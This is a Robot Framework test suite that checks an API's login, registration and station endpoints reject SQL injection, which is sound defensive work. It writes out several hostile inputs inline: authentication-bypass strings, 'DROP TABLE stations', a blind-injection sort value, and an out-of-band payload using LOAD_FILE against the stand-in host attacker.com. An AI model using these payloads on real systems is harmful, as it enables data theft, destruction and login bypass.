*** Settings ***
Documentation       A03: Injection - SQL Injection Tests
...                 Verifies SQL injection payloads are rejected in all inputs
Library             Collections
Library             RequestsLibrary
Library             ../../../libraries/SecurityLibrary.py
Resource            ../../../resources/common.resource
Resource            ../../../resources/variables.resource
Test Setup          Setup Test Case
Test Teardown       Teardown Test Case

*** Variables ***
@{SQL_INJECTION_FIELDS}      name    username    email    search    filter    query    sort

*** Test Cases ***
TC-SQL-001: Basic Sql Injection In Username Field
    [Documentation]   Verify ' OR '1'='1 is rejected in username
    ${headers}=    Create Dictionary    Content-Type=application/json
    ${payload}=    Create Dictionary    username=${SQL_PAYLOAD_1}    password=test
    ${response}=    POST    dgsn    /auth/login    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}
    ${body}=    Set Variable    ${response.json()}
    Dictionary Should Contain Key    ${body}    error

TC-SQL-002: Union Based Sql Injection In Username
    [Documentation]   Verify UNION SELECT is rejected
    ${headers}=    Create Dictionary    Content-Type=application/json
    ${payload}=    Create Dictionary    username=${SQL_PAYLOAD_3}    password=test
    ${response}=    POST    dgsn    /auth/login    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-SQL-003: Drop Table Injection Via Search
    [Documentation]   Verify DROP TABLE injection is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${params}=    Create Dictionary    search=${SQL_PAYLOAD_2}
    ${response}=    GET    dgsn    /stations    headers=${headers}    params=${params}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-SQL-004: Blind Sql Injection Via Sort Parameter
    [Documentation]   Verify blind SQL injection via sort is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${params}=    Create Dictionary    sort=name;SELECT+CASE+WHEN+1=1+THEN+1+ELSE+0+END
    ${response}=    GET    dgsn    /stations    headers=${headers}    params=${params}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-SQL-005: Time Based Blind Sql Injection
    [Documentation]   Verify SLEEP/BENCHMARK injection is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${params}=    Create Dictionary    filter=${SQL_PAYLOAD_7}
    ${response}=    GET    dgsn    /stations    headers=${headers}    params=${params}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-SQL-006: Error Based Sql Injection
    [Documentation]   Verify error-based injection is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${params}=    Create Dictionary    filter=${SQL_PAYLOAD_8}
    ${response}=    GET    dgsn    /stations    headers=${headers}    params=${params}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-SQL-007: Like Injection In Email Field
    [Documentation]   Verify LIKE injection in email is rejected
    ${headers}=    Create Dictionary    Content-Type=application/json
    ${payload}=    Create Dictionary    username=newuser@test.com    password=TestPass123!    email=${SQL_PAYLOAD_9}
    ${response}=    POST    dgsn    /auth/register    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-SQL-008: Hex Encoded Injection
    [Documentation]   Verify hex-encoded injection is rejected
    ${headers}=    Create Dictionary    Content-Type=application/json
    ${payload}=    Create Dictionary    username=${SQL_PAYLOAD_10}    password=test
    ${response}=    POST    dgsn    /auth/login    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-SQL-009: Second Order Sql Injection
    [Documentation]   Verify second-order injection via stored data
    ${headers}    ${token}=    Authenticate As Regular User
    ${malicious_name}=    Set Variable    Robert'; DROP TABLE stations; --
    ${station_payload}=    Generate Station Payload    name=${malicious_name}
    ${response}=    POST    dgsn    /stations    json=${station_payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_CREATED}    ${response}

TC-SQL-010: Sql Injection In Station Name Field
    [Documentation]   Verify SQL injection in station name is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${payload}=    Generate Station Payload    name=${SQL_PAYLOAD_1}
    ${response}=    POST    dgsn    /stations    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-SQL-011: Sql Injection In Station Frequency
    [Documentation]   Verify injection in numeric field is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${payload}=    Generate Station Payload    frequency_mhz=${SQL_PAYLOAD_1}
    ${response}=    POST    dgsn    /stations    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-SQL-012: Batch Sql Injection Via Headers
    [Documentation]   Verify injection in custom headers is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    Set To Dictionary    ${headers}    X-Forwarded-For=${SQL_PAYLOAD_2}
    ${response}=    GET    dgsn    /stations    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-SQL-013: Out Of Band Sql Injection
    [Documentation]   Verify out-of-band exfiltration attempts are blocked
    ${headers}=    Create Dictionary    Content-Type=application/json
    ${payload}=    Create Dictionary    username=test' UNION SELECT LOAD_FILE('//attacker.com/leak') --    password=test
    ${response}=    POST    dgsn    /auth/login    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-SQL-014: Comment Injection Is Blocked
    [Documentation]   Verify comment-based injection is blocked
    ${headers}=    Create Dictionary    Content-Type=application/json
    ${payload}=    Create Dictionary    username=admin'--    password=anything
    ${response}=    POST    dgsn    /auth/login    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-SQL-015: Tautology Injection Is Blocked
    [Documentation]   Verify 1=1 tautology injection is blocked
    ${headers}=    Create Dictionary    Content-Type=application/json
    ${payload}=    Create Dictionary    username=admin' AND 1=1 --    password=test
    ${response}=    POST    dgsn    /auth/login    json=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

*** Keywords ***
Setup Test Case
    ${timestamp}=    Get Current Date    result_format=epoch
    Set Test Variable    ${TEST_TIMESTAMP}    ${timestamp}

Teardown Test Case
    Log    SQL injection test completed at ${TEST_TIMESTAMP}
